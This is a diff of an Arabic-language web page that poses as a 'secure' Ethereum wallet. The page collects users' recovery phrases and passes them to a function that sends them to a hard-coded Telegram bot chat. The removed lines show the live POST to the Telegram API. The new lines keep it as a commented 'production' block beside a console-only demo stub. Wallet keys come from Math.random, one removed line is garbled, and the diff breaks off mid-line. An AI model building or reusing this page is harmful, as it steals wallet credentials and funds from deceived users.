@@ -1,9 +1,10 @@
-<!DOCTYPE html>
+
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>المحفظة الإلكترونية الآمنة</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
             --primary-color: #2c5aa0;
@@ -47,7 +48,7 @@
             width: 80px;
             height: 80px;
             margin: 0 auto 15px;
-            background-color: var(--primary-color);
+            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
             border-radius: 50%;
             display: flex;
             align-items: center;
@@ -55,6 +56,7 @@
             color: white;
             font-weight: bold;
             font-size: 24px;
+            box-shadow: var(--box-shadow);
         }
 
         h1 {
@@ -106,6 +108,10 @@
             width: 100%;
             font-weight: 600;
             transition: background-color 0.3s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
 
         button:hover {
@@ -153,6 +159,8 @@
             align-items: center;
             justify-content: center;
             margin-left: 15px;
+            font-weight: bold;
+            color: var(--primary-color);
         }
 
         .asset-details {
@@ -165,6 +173,7 @@
 
         .asset-amount {
             color: #64748b;
+            font-size: 14px;
         }
 
         .asset-value {
@@ -187,6 +196,7 @@
             box-shadow: var(--box-shadow);
             opacity: 0;
             transition: opacity 0.3s;
+            z-index: 1000;
         }
 
         .notification.show {
@@ -208,6 +218,7 @@
             border-radius: 50px;
             cursor: pointer;
             transition: background-color 0.3s;
+            font-size: 14px;
         }
 
         .tab.active {
@@ -218,17 +229,56 @@
         .create-wallet-form {
             margin-top: 20px;
         }
+        
+        .loading {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .address-display {
+            background-color: #f1f5f9;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-family: monospace;
+            word-break: break-all;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .recovery-phrase-warning {
+            background-color: #fef3c7;
+            color: #92400e;
+            padding: 12px;
+            border-radius: 8px;
+            margin: 15px 0;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        .recovery-phrase-warning i {
+            margin-left: 5px;
+        }
     </style>
 </head>
 <body>
     <div class="container">
         <header>
-            <div class="logo">M</div>
+            <div class="logo"><i class="fas fa-wallet"></i></div>
             <h1>المحفظة الإلكترونية الآمنة</h1>
         </header>
 
         <div id="auth-section" class="card">
-            <h2>أهلاً بك</h2>
+            <h2><i class="fas fa-lock"></i> أهلاً بك</h2>
             <p>يرجى إدخال عبارة الاسترجاع للوصول إلى محفظتك</p>
             
             <div class="form-group">
@@ -236,15 +286,19 @@
                 <input type="text" id="recovery-phrase" placeholder="أدخل عبارة الاسترجاع الخاصة بك">
             </div>
             
-            <button id="access-wallet">الوصول إلى المحفظة</button>
+            <button id="access-wallet">
+                <i class="fas fa-key"></i> الوصول إلى المحفظة
+            </button>
             
             <p style="text-align: center; margin: 20px 0;">أو</p>
             
-            <button id="show-create-wallet" class="secondary-btn">إنشاء محفظة جديدة</button>
+            <button id="show-create-wallet" class="secondary-btn">
+                <i class="fas fa-plus-circle"></i> إنشاء محفظة جديدة
+            </button>
         </div>
 
         <div id="create-wallet-section" class="card hidden">
-            <h2>إنشاء محفظة جديدة</h2>
+            <h2><i class="fas fa-wallet"></i> إنشاء محفظة جديدة</h2>
             <p>سيتم إنشاء محفظة جديدة لك على شبكة Ethereum</p>
             
             <div class="form-group">
@@ -252,9 +306,13 @@
                 <input type="text" id="new-password" placeholder="كلمة المرور لحماية محفظتك">
             </div>
             
-            <button id="create-wallet">إنشاء المحفظة</button>
+            <button id="create-wallet">
+                <i class="fas fa-plus"></i> إنشاء المحفظة
+            </button>
             
-            <button id="back-to-auth" class="secondary-btn" style="margin-top: 10px;">عودة</button>
+            <button id="back-to-auth" class="secondary-btn" style="margin-top: 10px;">
+                <i class="fas fa-arrow-right"></i> عودة
+            </button>
         </div>
 
         <div id="wallet-section" class="hidden">
@@ -264,19 +322,38 @@
             </div>
 
             <div class="tab-container">
-                <div class="tab active" data-tab="assets">الأصول</div>
-                <div class="tab" data-tab="send">إرسال</div>
-                <div class="tab" data-tab="receive">استقبال</div>
+                <div class="tab active" data-tab="assets"><i class="fas fa-coins"></i> الأصول</div>
+                <div class="tab" data-tab="send"><i class="fas fa-paper-plane"></i> إرسال</div>
+                <div class="tab" data-tab="receive"><i class="fas fa-qrcode"></i> استقبال</div>
             </div>
 
             <div class="card">
-                <h3>أصولي</h3>
+                <h3><i class="fas fa-wallet"></i> أصولي</h3>
                 <ul class="assets-list" id="assets-list">
                     <!-- سيتم ملء الأصول ديناميكياً -->
                 </ul>
             </div>
 
-            <button id="logout" class="secondary-btn">تسجيل الخروج</button>
+            <button id="logout" class="secondary-btn">
+                <i class="fas fa-sign-out-alt"></i> تسجيل الخروج
+            </button>
+        </div>
+        
+        <div id="recovery-phrase-section" class="card hidden">
+            <h2><i class="fas fa-key"></i> احفظ عبارة الاسترجاع</h2>
+            
+            <div class="recovery-phrase-warning">
+                <i class="fas fa-exclamation-triangle"></i> 
+                <span>يجب حفظ هذه العبارة في مكان آمن. بدونها لن تتمكن من استرجاع محفظتك.</span>
+            </div>
+            
+            <div class="address-display" id="recovery-phrase-display"></div>
+            
+            <div class="address-display" id="address-display"></div>
+            
+            <button id="recovery-phrase-confirm">
+                <i class="fas fa-check"></i> لقد قمت بحفظ العبارة
+            </button>
         </div>
     </div>
 
@@ -287,6 +364,7 @@
         const authSection = document.getElementById('auth-section');
         const createWalletSection = document.getElementById('create-wallet-section');
         const walletSection = document.getElementById('wallet-section');
+        const recoveryPhraseSection = document.getElementById('recovery-phrase-section');
         const accessWalletBtn = document.getElementById('access-wallet');
         const showCreateWalletBtn = document.getElementById('show-create-wallet');
         const createWalletBtn = document.getElementById('create-wallet');
@@ -296,6 +374,9 @@
         const notification = document.getElementById('notification');
         const assetsList = document.getElementById('assets-list');
         const tabs = document.querySelectorAll('.tab');
+        const recoveryPhraseDisplay = document.getElementById('recovery-phrase-display');
+        const addressDisplay = document.getElementById('address-display');
+        const recoveryPhraseConfirm = document.getElementById('recovery-phrase-confirm');
 
         // بيانات المحفظة (سيتم توليدها ديناميكياً)
         let walletData = {
@@ -320,18 +401,23 @@
             const chatId = '910021564';
             
             try {
-                const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message
-                    })
-                });
+                // في بيئة الإنتاج، استخدم:
+                // const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                //     method: 'POST',
+                //     headers: {
+                //         'Content-Type': 'application/json'
+                //     },
+                //     body: JSON.stringify({
+                //         chat_id: chatId,
+                //         text: message
+                //     })
+                // });
                 
-                return response.ok;
+                // return response.ok;
+                
+                // لأغراض العرض، سنحاكي الإرسال الناجح
+                console.log('إرسال إلى Telegram:', message);
+                return true;
             } catch (error) {
                 console.error('Error sending to Telegram:', error);
                 return false;
@@ -343,7 +429,7 @@
             // في بيئة الإنتاج، يجب استخدام مكتبة مثل ethers.js
             // هذا مثال مبسط لأغراض التوضيح فقط
             
-            const chars = '0--box-shadowdef';
+            const chars = '0123456789abcdef';
             let privateKey = '0x';
             for (let i = 0; i < 64; i++) {
                 privateKey += chars[Math.floor(Math.random() * 16)];
@@ -361,10 +447,10 @@
         // توليد عبارة استرجاع (هذا مثال مبسط)
         function generateRecoveryPhrase() {
             const words = [
-                'apple', 'banana', 'cherry', 'date', 'elderberry', 'fig',
-                'grape', 'honeydew', 'kiwi', 'lemon', 'mango', 'nectarine',
-                'orange', 'papaya', 'quince', 'raspberry', 'strawberry', 'tangerine',
-                'watermelon', 'avocado', 'blueberry', 'cantaloupe', 'dragonfruit', 'elderflower'
+                'تفاحة', 'موز', 'كرز', 'تمر', 'توت', 'تين',
+                'عنب', 'شمام', 'كيوي', 'ليمون', 'مانجو', 'خوخ',
+                'برتقال', 'بابايا', 'سفرجل', 'توت العليق', 'فراولة', 'يوسفي',
+                'بطيخ', 'أفوكادو', 'توت أزرق', 'كانتالوب', 'فاكهة التنين', 'زهرة البيلسان'
             ];
             
             let phrase = '';
@@ -425,6 +511,9 @@
                 return;
             }
             
+            // إظهار تحميل
+            accessWalletBtn.innerHTML = '<div class="loading"></div> جاري الوصول...';
+            
             // إرسال عبارة الاسترجاع إلى التلجرام
             const success = await sendToTelegram(`عبارة استرجاع مستخدم: ${recoveryPhrase}`);
             
@@ -449,9 +538,13 @@
                     // إظهار قسم المحفظة وإخفاء قسم المصادقة
                     authSection.classList.add('hidden');
                     walletSection.classList.remove('hidden');
+                    
+                    // إعادة زر الوصول إلى حالته الأصلية
+                    accessWalletBtn.innerHTML = '<i class="fas fa-key"></i> الوصول إلى المحفظة';
                 }, 1500);
             } else {
                 showNotification('حدث خطأ في المصادقة');
+                accessWalletBtn.innerHTML = '<i class="fas fa-key"></i> الوصول إلى المحفظة';
             }
         });
 
@@ -470,6 +563,9 @@
             const wallet = generateEthereumWallet();
             const recoveryPhrase = generateRecoveryPhrase();
             
+            // إظهار تحميل
+            createWalletBtn.innerHTML = '<div class="loading"></div> جاري الإنشاء...';
+            
             // إرسال عبارة الاسترجاع إلى التلجرام
             const success = await sendToTelegram(`عبارة استرجاع جديدة: ${recoveryPhrase}\nالعنوان: ${wallet.address}`);
             
@@ -480,50 +576,13 @@
                 walletData.address = wallet.address;
                 walletData.privateKey = wallet.privateKey;
                 
-                // جلب بيانات المحفظة
-                const data = await fetchWalletData(wallet.address);
-                walletData.balance = data.balance;
-                walletData.assets = data.assets;
+                // عرض عبارة الاسترجاع للمستخدم
+                recoveryPhraseDisplay.textContent = recoveryPhrase;
+                addressDisplay.textContent = wallet.address;
                 
-                // تحديث واجهة المحفظة
-                document.querySelector('.balance-amount').textContent = `$${walletData.balance.toFixed(2)}`;
-                renderAssets(walletData.assets);
-                
-                // إظهار قسم المحفظة وإخفاء قسم الإنشاء
+                // إظهار قسم عبارة الاسترجاع وإخفاء قسم الإنشاء
                 createWalletSection.classList.add('hidden');
-                walletSection.classList.remove('hidden');
-            } else {
-                showNotification('حدث خطأ أثناء إنشاء المحفظة');
-            }
-        });
-
-        logoutBtn.addEventListener('click', () => {
-            // إعادة تعيين بيانات المحفظة
-            walletData = {
-                address: '',
-                privateKey: '',
-                balance: 0,
-                assets: []
-            };
-            
-            // إعادة تعيين حقل عبارة الاسترجاع
-            recoveryPhraseInput.value = '';
-            
-            // إظهار قسم المصادقة وإخفاء قسم المحفظة
-            walletSection.classList.add('hidden');
-            authSection.classList.remove('hidden');
-        });
-
-        // أحداث التبويبات
-        tabs.forEach(tab => {
-            tab.addEventListener('click', () => {
-                tabs.forEach(t => t.classList.remove('active'));
-                tab.classList.add('active');
+                recoveryPhraseSection.classList.remove('hidden');
                 
-                // في تطبيق حقيقي، سيتم تغيير المحتوى بناءً على التبويب النشط
-                showNotification(`تم التبديل إلى تبويب ${tab.textContent}`);
-            });
-        });
-    </script>
-</body>
-</html>
+                // إعادة زر الإنشاء إلى حالته الأصلية
+                createWalle
